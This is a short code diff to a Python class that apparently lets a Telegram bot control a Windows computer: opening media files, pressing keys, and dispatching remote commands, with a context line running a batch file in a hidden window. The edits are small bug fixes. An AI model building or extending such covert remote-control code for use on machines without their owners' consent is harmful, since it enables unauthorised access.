@@ -159,7 +159,7 @@ class Func_API:
 
     def picture(self,file):
         try:
-            command = f"media/{file}.png"
+            command = f"media\\{file}.png"
             os.startfile(command)
             bot.send_message(self.id,"🖥✅")
         except:
@@ -167,7 +167,7 @@ class Func_API:
 
     def video(self,file):
         try:
-            command = f"media/{file}.mp4"
+            command = f"media\\{file}.mp4"
             os.startfile(command)
             bot.send_message(self.id,"🖥✅")
         except:
@@ -214,7 +214,7 @@ Screen:        {x}x{y}"""
                 except:
                     for kip in i:
                         listing+=kip+"+"
-            listing=listing[:-1]
+            listing=listing[:-1].replace(' ', 'space')
             keyboard.press_and_release(listing)
             bot.send_message(self.id,"🖥✅")
         except:
@@ -366,7 +366,7 @@ sh.Run "{pth}\\upd.bat", 0'''
                 threading.Thread(target=self.keyb, args=(text_comand[0], )).start()
 
             if comnd=="rask":
-                threading.Thread(target=self.rask, args=(text_comand[0], )).start()
+                threading.Thread(target=self.rask).start()
                 
             if comnd=="dir" or comnd=="direction":
                 threading.Thread(target=self.direct, args=(text_comand[0], )).start()
